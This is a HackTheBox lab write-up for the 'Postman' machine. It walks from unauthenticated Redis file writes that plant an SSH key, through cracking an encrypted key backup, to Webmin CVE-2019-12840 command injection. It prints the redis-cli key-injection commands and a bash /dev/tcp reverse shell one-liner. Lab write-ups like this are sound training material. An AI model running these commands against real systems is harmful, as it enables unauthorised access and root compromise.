---
title: "Postman — HackTheBox Writeup (Linux Easy)"
published: 2026-08-26
description: "Writeup for the Postman machine on HackTheBox — Linux Easy. Chain: Redis unauthenticated access → SSH key injection → encrypted private key cracking → Webmin authenticated RCE (CVE-2019-12840) → root."
image: "/assets/images/writeups/postman/cover.png"
tags: [HackTheBox, Linux, Easy, Redis, Webmin, CVE-2019-12840, SSH]
category: Writeups
draft: false
---

## Overview

**Postman** is an Easy Linux machine from HackTheBox that demonstrates the dangers of unauthenticated Redis access combined with a vulnerable web administration panel. The initial foothold is gained by exploiting a Redis instance that allows unauthenticated connections — we abuse its ability to write arbitrary files to inject an SSH public key into the `redis` user's `authorized_keys`. From there, local enumeration reveals an encrypted SSH private key backup belonging to another user. After cracking the passphrase, we pivot to that user and reuse the same credentials to authenticate to a Webmin instance running as root. The Webmin version is vulnerable to CVE-2019-12840, an authenticated Remote Code Execution flaw in the package update module, which gives us a root shell.

**Topics covered:**

- Redis unauthenticated access and file-write abuse
- SSH public key injection via Redis `CONFIG SET` and `SAVE`
- Encrypted SSH private key cracking with John the Ripper
- Credential reuse across services
- **CVE-2019-12840** — Webmin authenticated RCE via the `/package-updates/update.cgi` endpoint
- Privilege escalation through a service running as root

![Postman Cover](/assets/images/writeups/postman/cover.png)

---

## Initial Access

### Nmap

```bash
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
6379/tcp  open  redis   syn-ack ttl 63 Redis key-value store 4.0.9
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Four services are exposed: SSH, a web server on port 80, Redis on port 6379, and Webmin on port 10000.

### Web Enumeration

Port 80 hosts a static personal website:

![Static website on port 80](/assets/images/writeups/postman/image.png)

Nothing interesting here — just a static page with the email `Postman@htb`.

Port 10000 hosts a **Webmin** login panel:

![Webmin login page](/assets/images/writeups/postman/image-1.png)

![Webmin SSL redirect](/assets/images/writeups/postman/image-2.png)

:::note
**Webmin** is a web-based system administration tool for Unix-like servers. It provides a GUI for managing users, services, configuration files, and more.
:::

The Nmap results show it is running `MiniServ 1.910`, which is vulnerable to [CVE-2019-12840](https://feedly.com/cve/CVE-2019-12840) — an **authenticated RCE**. Since I don't have any credentials yet, I cannot exploit it at this stage.

### Redis Enumeration

Redis is running on port 6379 without authentication. I used [HackTricks](https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html#ssh) as a reference for Redis exploitation techniques.

The key discovery is that I can change Redis's working directory to the `.ssh` folder:

```bash
$ redis-cli -h 10.129.2.1
10.129.2.1:6379> CONFIG GET DIR
1) "dir"
2) "/var/lib/redis"
10.129.2.1:6379> CONFIG SET dir .ssh
OK
```

This means I can write an SSH public key to the `redis` user's `authorized_keys` file.

### SSH Key Injection via Redis

**Step 1: Generate an SSH key pair**

```bash
$ ssh-keygen -t ed25519 -f ./id_ed25519
```

**Step 2: Write the public key into Redis**

The newlines before and after the key content ensure Redis's internal formatting doesn't corrupt the key:

```bash
$ (echo -e "\n\n"; cat ./id_ed25519.pub; echo -e "\n\n") | redis-cli -h 10.129.2.1 -x set sshkey
OK
```

**Step 3: Set the target directory and filename, then save to disk**

```bash
10.129.2.1:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
10.129.2.1:6379> CONFIG SET dbfilename authorized_keys
OK
10.129.2.1:6379> SAVE
OK
```

This writes the Redis database (containing our key) to `/var/lib/redis/.ssh/authorized_keys`. Now I can SSH in as the `redis` user:

![SSH access as redis](/assets/images/writeups/postman/image-3.png)

### Local Enumeration

With shell access as `redis`, I found a home directory for user `Matt`:

![Matt's home directory](/assets/images/writeups/postman/image-4.png)

I also found a backup SSH private key in `/opt`:

```bash
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
...
-----END RSA PRIVATE KEY-----
```

This is an **encrypted RSA private key** in legacy PEM (PKCS#1) format. The `Proc-Type: 4,ENCRYPTED` header indicates it requires a passphrase to use. The `DEK-Info` line shows it uses Triple-DES in CBC mode for encryption — a relatively weak cipher that makes brute-force cracking feasible.

### Cracking the SSH Key Passphrase

```bash
$ ssh2john id_rsa > id_rsa.hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
computer2008     (id_rsa)
```

The passphrase is **`computer2008`**.

### Pivoting to Matt

Direct SSH login with the key fails (the server closes the connection — likely `Matt` is denied SSH access via `AllowUsers` or `DenyUsers` in `sshd_config`):

```bash
$ ssh -i id_rsa Matt@10.129.2.1
Enter passphrase for key 'id_rsa':
Connection closed by 10.129.2.1 port 22
```

However, since I already have a shell as `redis`, I can try using the passphrase as Matt's system password via `su`:

![su to Matt — user flag captured](/assets/images/writeups/postman/image-5.png)

**User flag captured!**

---

## Privilege Escalation

### Webmin as Root

Earlier, I identified that Webmin (`MiniServ 1.910`) is vulnerable to CVE-2019-12840, but it requires authentication. Let me check what privileges the Webmin service runs with:

```bash
Matt@Postman:/opt$ ps aux | grep -i webmin
root        775  0.0  3.1  91060 28956 ?        Ss   15:00   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

Webmin is running as **root**. If I can exploit the authenticated RCE, I'll get a root shell.

The only credentials I have are Matt's:

```
Matt : computer2008
```

They work on the Webmin login:

![Webmin logged in as Matt](/assets/images/writeups/postman/image-6.png)

### CVE-2019-12840 — Webmin Authenticated RCE

:::tip[What is CVE-2019-12840?]
CVE-2019-12840 is an authenticated Remote Code Execution vulnerability in Webmin versions up to 1.910. The `/package-updates/update.cgi` endpoint fails to properly sanitize user input in the package update functionality, allowing an authenticated user to inject arbitrary OS commands that execute as the Webmin process owner (typically root).
:::

I studied the vulnerability from the [exploit code on Exploit-DB](https://www.exploit-db.com/exploits/46984). The vulnerable endpoint is `/package-updates/update.cgi`:

![Vulnerable endpoint](/assets/images/writeups/postman/image-7.png)

The request with injected command:

![Request with command injection](/assets/images/writeups/postman/image-8.png)

Injecting a reverse shell payload:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.239/1337 0>&1'
```

![Reverse shell payload injected](/assets/images/writeups/postman/image-9.png)

After a few seconds, I received a shell on my listener:

![Root shell received](/assets/images/writeups/postman/image-10.png)

**Root flag captured!**
